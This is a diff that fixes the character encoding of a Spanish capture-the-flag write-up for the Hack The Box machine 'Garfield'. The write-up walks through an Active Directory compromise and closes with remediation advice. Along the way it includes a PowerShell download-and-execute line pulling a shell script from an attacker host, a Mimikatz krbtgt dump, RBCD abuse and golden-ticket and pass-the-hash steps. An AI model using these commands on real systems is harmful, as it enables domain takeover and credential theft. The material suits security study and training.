@@ -1,14 +1,14 @@
-﻿---
+---
 layout: single
 classes: wide
 title: "Garfield - Writeup"
 date: 2026-06-04
-difficulty: DifÃ­cil
+difficulty: Difícil
 operating_system: Windows
 tags:
   - HTB
   - Windows
-  - DifÃ­cil
+  - Difícil
   - Active Directory
   - SYSVOL
   - RBCD
@@ -17,15 +17,15 @@ tags:
   - Mimikatz
   - Rubeus
   - Chisel
-summary: "ExplotaciÃ³n completa de un dominio Active Directory partiendo de credenciales iniciales de dominio: abuso de scriptPath en SYSVOL para RCE como l.wilson, ForceChangePassword a l.wilson_adm, RBCD + S4U2Proxy contra un RODC, dump de krbtgt_8245 con Mimikatz, y golden ticket para acceso como Domain Admin."
+summary: "Explotación completa de un dominio Active Directory partiendo de credenciales iniciales de dominio: abuso de scriptPath en SYSVOL para RCE como l.wilson, ForceChangePassword a l.wilson_adm, RBCD + S4U2Proxy contra un RODC, dump de krbtgt_8245 con Mimikatz, y golden ticket para acceso como Domain Admin."
 ---
 
-## InformaciÃ³n general
+## Información general
 
 | Campo | Valor |
 |-------|-------|
 | Sistema operativo | Windows |
-| Dificultad | DifÃ­cil |
+| Dificultad | Difícil |
 | IP | `[REDACTED]` |
 | Domain | `garfield.htb` |
 | DC | `DC01.garfield.htb` |
@@ -43,15 +43,15 @@ Empezamos con un escaneo de puertos completo para identificar todos los servicio
 nmap -p- --open -sS --min-rate 5000 -vvv -Pn [REDACTED]
 ```
 
-Puertos abiertos â€” clÃ¡sica mÃ¡quina Windows Domain Controller:
+Puertos abiertos — clásica máquina Windows Domain Controller:
 
-| Puerto | Servicio | VersiÃ³n |
+| Puerto | Servicio | Versión |
 |--------|----------|---------|
 | 53/tcp | DNS | Simple DNS Plus |
 | 88/tcp | Kerberos | Microsoft Windows Kerberos |
 | 135/tcp | MSRPC | Microsoft Windows RPC |
 | 139/tcp | NetBIOS | Microsoft Windows netbios-ssn |
-| 389/tcp | LDAP | Microsoft AD LDAP â€” `garfield.htb` |
+| 389/tcp | LDAP | Microsoft AD LDAP — `garfield.htb` |
 | 445/tcp | SMB | Microsoft-ds |
 | 464/tcp | kpasswd5 | |
 | 593/tcp | RPC over HTTP | |
@@ -64,9 +64,9 @@ Confirmamos que es un Domain Controller: `DC01.garfield.htb`, Server 2019 Build 
 
 ---
 
-## EnumeraciÃ³n
+## Enumeración
 
-### SMB â€” shares accesibles
+### SMB — shares accesibles
 
 Con las credenciales proporcionadas (`j.arbuckle`), listamos los recursos compartidos:
 
@@ -91,7 +91,7 @@ echo Printer detection completed.
 pause
 ```
 
-### LDAP â€” user enumeration
+### LDAP — user enumeration
 
 Enumeramos usuarios del dominio:
 
@@ -101,31 +101,31 @@ netexec ldap [REDACTED] -u j.arbuckle -p '[REDACTED]' --users
 
 Usuarios relevantes:
 
-| Usuario | DescripciÃ³n |
+| Usuario | Descripción |
 |---------|-------------|
 | `j.arbuckle` | Usuario inicial (nosotros) |
-| `l.wilson` | Usuario de dominio estÃ¡ndar |
-| `l.wilson_adm` | **Posible cuenta privilegiada** (2 badPW â€” tal vez contraseÃ±a por defecto o dÃ©bil) |
-| `krbtgt_8245` | Cuenta krbtgt del RODC â€” ID 8245 |
+| `l.wilson` | Usuario de dominio estándar |
+| `l.wilson_adm` | **Posible cuenta privilegiada** (2 badPW — tal vez contraseña por defecto o débil) |
+| `krbtgt_8245` | Cuenta krbtgt del RODC — ID 8245 |
 
-### bloodAD â€” permisos de escritura
+### bloodAD — permisos de escritura
 
 ```bash
 bloodyAD --host [REDACTED] -u j.arbuckle -p '[REDACTED]' get writable
 ```
 
-Entre los objetos con permiso `WRITE` estaba `CN=Liz Wilson` â€” la cuenta `l.wilson`. Esto nos permite modificar su atributo `scriptPath`.
+Entre los objetos con permiso `WRITE` estaba `CN=Liz Wilson` — la cuenta `l.wilson`. Esto nos permite modificar su atributo `scriptPath`.
 
 ---
 
-## ExplotaciÃ³n â€” RCE como l.wilson via scriptPath
+## Explotación — RCE como l.wilson via scriptPath
 
 ### El vector
 
-El atributo `scriptPath` en un usuario de AD define un script de inicio de sesiÃ³n que se ejecuta desde `SYSVOL`. Si tenemos permisos de escritura sobre el usuario y sobre `SYSVOL`, podemos:
+El atributo `scriptPath` en un usuario de AD define un script de inicio de sesión que se ejecuta desde `SYSVOL`. Si tenemos permisos de escritura sobre el usuario y sobre `SYSVOL`, podemos:
 1. Subir un `.bat` malicioso a `SYSVOL`
 2. Apuntar `scriptPath` del usuario a ese `.bat`
-3. Esperar a que el usuario inicie sesiÃ³n â†’ RCE
+3. Esperar a que el usuario inicie sesión → RCE
 
 ### Payload
 
@@ -153,7 +153,7 @@ Modificamos `printerDetect.bat` para que descargue y ejecute el payload:
 powershell -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://[REDACTED]/shell.ps1')"
 ```
 
-### Subida y configuraciÃ³n
+### Subida y configuración
 
 Subimos el `.bat` malicioso a SYSVOL:
 
@@ -174,7 +174,7 @@ bloodyAD --host [REDACTED] \
   -v printerDetect.bat
 ```
 
-### RecepciÃ³n de la shell
+### Recepción de la shell
 
 Montamos servidor HTTP con el `shell.ps1` y un listener en `nc`:
 
@@ -183,7 +183,7 @@ python3 -m http.server 80 &
 nc -nlvp 4444
 ```
 
-Al poco tiempo recibimos la conexiÃ³n:
+Al poco tiempo recibimos la conexión:
 
 ```bash
 connect to [REDACTED] from (UNKNOWN) [REDACTED] 54263
@@ -195,9 +195,9 @@ garfield\l.wilson
 
 ---
 
-## Pivoting â€” ForceChangePassword a l.wilson_adm
+## Pivoting — ForceChangePassword a l.wilson_adm
 
-Desde la shell de `l.wilson` aprovechamos que tenemos permisos para cambiar la contraseÃ±a de `l.wilson_adm`:
+Desde la shell de `l.wilson` aprovechamos que tenemos permisos para cambiar la contraseña de `l.wilson_adm`:
 
 ```powershell
 Set-ADAccountPassword -Identity l.wilson_adm -Reset -NewPassword (ConvertTo-SecureString "[REDACTED]" -AsPlainText -Force)
@@ -219,11 +219,11 @@ evil-winrm -i [REDACTED] -u L.WILSON_ADM -p [REDACTED]
 [REDACTED]
 ```
 
-**ðŸš© Flag de usuario: `[REDACTED]`**
+**🚩 Flag de usuario: `[REDACTED]`**
 
 ---
 
-## Escalada de privilegios â€” RODC compromise â†’ Domain Admin
+## Escalada de privilegios — RODC compromise → Domain Admin
 
 ### Paso 1: Unirse al grupo RODC Administrators
 
@@ -234,13 +234,13 @@ bloodyAD -u l.wilson_adm -p '[REDACTED]' -d garfield.htb --host [REDACTED] \
 
 ### Paso 2: SOCKS proxy al segmento interno
 
-El RODC (`RODC01`) estÃ¡ en una subred interna (`192.168.100.0/24`). Usamos **Chisel** para montar un tÃºnel SOCKS5:
+El RODC (`RODC01`) está en una subred interna (`192.168.100.0/24`). Usamos **Chisel** para montar un túnel SOCKS5:
 
 ```bash
 # Atacante
 ./chisel server -p 8889 --reverse &
 
-# VÃ­ctima (evil-winrm)
+# Víctima (evil-winrm)
 .\chisel.exe client [REDACTED]:8889 R:socks
 ```
 
@@ -257,9 +257,9 @@ proxychains nmap -sT -Pn -p 445,5985 192.168.100.2
 # 445/open, 5985/open
 ```
 
-### Paso 3: RBCD â€” Resource-Based Constrained Delegation
+### Paso 3: RBCD — Resource-Based Constrained Delegation
 
-Creamos una cuenta de mÃ¡quina falsa:
+Creamos una cuenta de máquina falsa:
 
 ```bash
 impacket-addcomputer garfield.htb/j.arbuckle:'[REDACTED]' \
@@ -268,7 +268,7 @@ impacket-addcomputer garfield.htb/j.arbuckle:'[REDACTED]' \
   -computer-pass '[REDACTED]'
 ```
 
-Derivamos el AES256 key de la contraseÃ±a para usarla en lugar de la contraseÃ±a en texto claro:
+Derivamos el AES256 key de la contraseña para usarla en lugar de la contraseña en texto claro:
 
 ```bash
 python3 -c "
@@ -303,7 +303,7 @@ Esto nos da un ticket de `Administrator` para acceder al RODC.
 
 ### Paso 4: Acceso al RODC como SYSTEM
 
-Ejecutamos psexec a travÃ©s del proxy SOCKS:
+Ejecutamos psexec a través del proxy SOCKS:
 
 ```bash
 export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
@@ -320,13 +320,13 @@ Descargamos Mimikatz:
 powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://[REDACTED]:80/mimikatz.exe', 'C:\Windows\Temp\mimikatz.exe')"
 ```
 
-Dumpeamos las credenciales de la cuenta `krbtgt_8245` â€” la cuenta krbtgt especÃ­fica del RODC:
+Dumpeamos las credenciales de la cuenta `krbtgt_8245` — la cuenta krbtgt específica del RODC:
 
 ```
 mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" "exit"
 ```
 
-Datos crÃ­ticos obtenidos:
+Datos críticos obtenidos:
 
 | Key | Valor |
 |-----|-------|
@@ -336,13 +336,13 @@ Datos crÃ­ticos obtenidos:
 
 El RODC tiene su propia cuenta krbtgt (ID 8245) cuyo hash podemos usar para forjar tickets.
 
-### Paso 6: Configurar RODC para revelar contraseÃ±a de Administrator
+### Paso 6: Configurar RODC para revelar contraseña de Administrator
 
-El RODC tiene dos atributos que controlan quÃ© credenciales puede almacenar en cachÃ©:
-- `msDS-RevealOnDemandGroup` â€” grupos cuyas credenciales se revelan bajo demanda
-- `msDS-NeverRevealGroup` â€” grupos cuyas credenciales nunca se revelan
+El RODC tiene dos atributos que controlan qué credenciales puede almacenar en caché:
+- `msDS-RevealOnDemandGroup` — grupos cuyas credenciales se revelan bajo demanda
+- `msDS-NeverRevealGroup` — grupos cuyas credenciales nunca se revelan
 
-Agregamos `Administrator` al grupo de revelaciÃ³n y limpiamos el de restricciÃ³n:
+Agregamos `Administrator` al grupo de revelación y limpiamos el de restricción:
 
 ```powershell
 Set-ADObject -Identity "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" `
@@ -402,43 +402,43 @@ garfield\administrator
 [REDACTED]
 ```
 
-**ðŸš© Flag de root: `[REDACTED]`**
+**🚩 Flag de root: `[REDACTED]`**
 
 ---
 
-## Cadena de explotaciÃ³n
+## Cadena de explotación
 
 ```
 Credenciales iniciales: j.arbuckle / [REDACTED]
-        â”‚
-        â–¼
+        │
+        ▼
 Escritura en SYSVOL + scriptPath en l.wilson
-â†’ RCE como l.wilson (vÃ­a script de inicio de sesiÃ³n)
-        â”‚
-        â–¼
+→ RCE como l.wilson (vía script de inicio de sesión)
+        │
+        ▼
 ForceChangePassword a l.wilson_adm
-â†’ WinRM como l.wilson_adm
-â†’ user.txt âœ…
-        â”‚
-        â–¼
+→ WinRM como l.wilson_adm
+→ user.txt ✅
+        │
+        ▼
 Agregado a RODC Administrators + Chisel SOCKS proxy
-â†’ Acceso a segmento interno (192.168.100.0/24)
-        â”‚
-        â–¼
-RBCD: FAKEPC$ â†’ RODC01$ + S4U2Proxy
-â†’ psexec como SYSTEM en RODC01
-        â”‚
-        â–¼
+→ Acceso a segmento interno (192.168.100.0/24)
+        │
+        ▼
+RBCD: FAKEPC$ → RODC01$ + S4U2Proxy
+→ psexec como SYSTEM en RODC01
+        │
+        ▼
 Mimikatz: dump krbtgt_8245 hash
-â†’ Golden Ticket forjado con Rubeus
-        â”‚
-        â–¼
+→ Golden Ticket forjado con Rubeus
+        │
+        ▼
 Configurar msDS-RevealOnDemandGroup + asktgs
-â†’ Hash NTLM de Administrator
-        â”‚
-        â–¼
+→ Hash NTLM de Administrator
+        │
+        ▼
 Pass-the-hash por WinRM a DC01
-â†’ Domain Admin âœ… â†’ root.txt âœ…
+→ Domain Admin ✅ → root.txt ✅
 ```
 
 ---
@@ -447,41 +447,41 @@ Pass-the-hash por WinRM a DC01
 
 | # | Vector | Impacto |
 |---|--------|---------|
-| 1 | Permiso `WRITE` sobre `l.wilson` permite modificar `scriptPath` | EjecuciÃ³n de cÃ³digo arbitrario en inicio de sesiÃ³n |
+| 1 | Permiso `WRITE` sobre `l.wilson` permite modificar `scriptPath` | Ejecución de código arbitrario en inicio de sesión |
 | 2 | `SYSVOL` escribible por `j.arbuckle` permite subir `.bat` malicioso | Persistencia del payload en el dominio |
-| 3 | `ForceChangePassword` de `l.wilson` sobre `l.wilson_adm` | Escalada a usuario con mÃ¡s privilegios |
+| 3 | `ForceChangePassword` de `l.wilson` sobre `l.wilson_adm` | Escalada a usuario con más privilegios |
 | 4 | `l.wilson_adm` puede agregarse a `RODC Administrators` | Control administrativo sobre el RODC |
-| 5 | RODC accesible desde segmento interno sin restricciones RBCD mal configurado | Compromiso del RODC vÃ­a S4U2Proxy |
-| 6 | `krbtgt_8245` con hash extraÃ­ble desde RODC | Golden ticket para cualquier cuenta |
-| 7 | `msDS-RevealOnDemandGroup` modificable por `l.wilson_adm` | RevelaciÃ³n de hash de `Administrator` |
+| 5 | RODC accesible desde segmento interno sin restricciones RBCD mal configurado | Compromiso del RODC vía S4U2Proxy |
+| 6 | `krbtgt_8245` con hash extraíble desde RODC | Golden ticket para cualquier cuenta |
+| 7 | `msDS-RevealOnDemandGroup` modificable por `l.wilson_adm` | Revelación de hash de `Administrator` |
 | 8 | WinRM habilitado en DC01 | Acceso remoto como Domain Admin |
 
 ---
 
-## Lecciones tÃ©cnicas
+## Lecciones técnicas
 
 ### scriptPath como vector de RCE
-El atributo `scriptPath` en objetos de usuario ejecuta un script desde `SYSVOL` al iniciar sesiÃ³n. Si un atacante tiene permisos de escritura sobre el usuario y sobre SYSVOL, puede ejecutar cÃ³digo arbitrario. Es un vector clÃ¡sico pero efectivo en entornos AD mal configurados.
+El atributo `scriptPath` en objetos de usuario ejecuta un script desde `SYSVOL` al iniciar sesión. Si un atacante tiene permisos de escritura sobre el usuario y sobre SYSVOL, puede ejecutar código arbitrario. Es un vector clásico pero efectivo en entornos AD mal configurados.
 
 ### RODC security boundaries
-Un RODC (Read-Only Domain Controller) estÃ¡ diseÃ±ado para ubicaciones de baja seguridad. Tiene su propia cuenta krbtgt y puede almacenar contraseÃ±as en cachÃ© segÃºn grupos. La configuraciÃ³n incorrecta de `msDS-RevealOnDemandGroup` y `msDS-NeverRevealGroup` permite a un atacante revelar credenciales privilegiadas.
+Un RODC (Read-Only Domain Controller) está diseñado para ubicaciones de baja seguridad. Tiene su propia cuenta krbtgt y puede almacenar contraseñas en caché según grupos. La configuración incorrecta de `msDS-RevealOnDemandGroup` y `msDS-NeverRevealGroup` permite a un atacante revelar credenciales privilegiadas.
 
 ### RBCD y S4U2Proxy
-Resource-Based Constrained Delegation permite que un objeto (como una cuenta de mÃ¡quina) delegue en otro. Si se puede crear una cuenta de mÃ¡quina y configurar RBCD, se puede impersonar cualquier usuario (como Administrator) para acceder al servicio objetivo.
+Resource-Based Constrained Delegation permite que un objeto (como una cuenta de máquina) delegue en otro. Si se puede crear una cuenta de máquina y configurar RBCD, se puede impersonar cualquier usuario (como Administrator) para acceder al servicio objetivo.
 
 ### Golden Ticket con krbtgt de RODC
-El hash de `krbtgt_8245` (la cuenta krbtgt del RODC) permite forjar tickets para cualquier usuario en el dominio. Aunque el RODC tiene restricciones, combinado con la modificaciÃ³n de `msDS-RevealOnDemandGroup`, permite obtener el hash de cualquier usuario.
+El hash de `krbtgt_8245` (la cuenta krbtgt del RODC) permite forjar tickets para cualquier usuario en el dominio. Aunque el RODC tiene restricciones, combinado con la modificación de `msDS-RevealOnDemandGroup`, permite obtener el hash de cualquier usuario.
 
 ---
 
-## RemediaciÃ³n
+## Remediación
 
-| Hallazgo | RemediciÃ³n |
+| Hallazgo | Remedición |
 |----------|------------|
-| Permiso `WRITE` excesivo sobre objetos de usuario | Revisar y restringir permisos de escritura usando el principio de mÃ­nimo privilegio |
+| Permiso `WRITE` excesivo sobre objetos de usuario | Revisar y restringir permisos de escritura usando el principio de mínimo privilegio |
 | `SYSVOL` escribible por usuarios no administradores | Restringir permisos de escritura en SYSVOL solo a `Domain Admins` |
-| `ForceChangePassword` sobre cuentas privilegiadas | Separar roles y no permitir que usuarios estÃ¡ndar cambien contraseÃ±as de cuentas con mÃ¡s privilegios |
-| `l.wilson_adm` en `RODC Administrators` | Revisar membresÃ­a de grupos administrativos del RODC |
-| RBCD sin restricciones | No permitir que usuarios no administradores creen cuentas de mÃ¡quina o configuren RBCD |
+| `ForceChangePassword` sobre cuentas privilegiadas | Separar roles y no permitir que usuarios estándar cambien contraseñas de cuentas con más privilegios |
+| `l.wilson_adm` en `RODC Administrators` | Revisar membresía de grupos administrativos del RODC |
+| RBCD sin restricciones | No permitir que usuarios no administradores creen cuentas de máquina o configuren RBCD |
 | `msDS-RevealOnDemandGroup` modificable | Restringir permisos de escritura sobre atributos del RODC |
 | WinRM en DC01 | Deshabilitar WinRM en Domain Controllers o restringir por firewall |
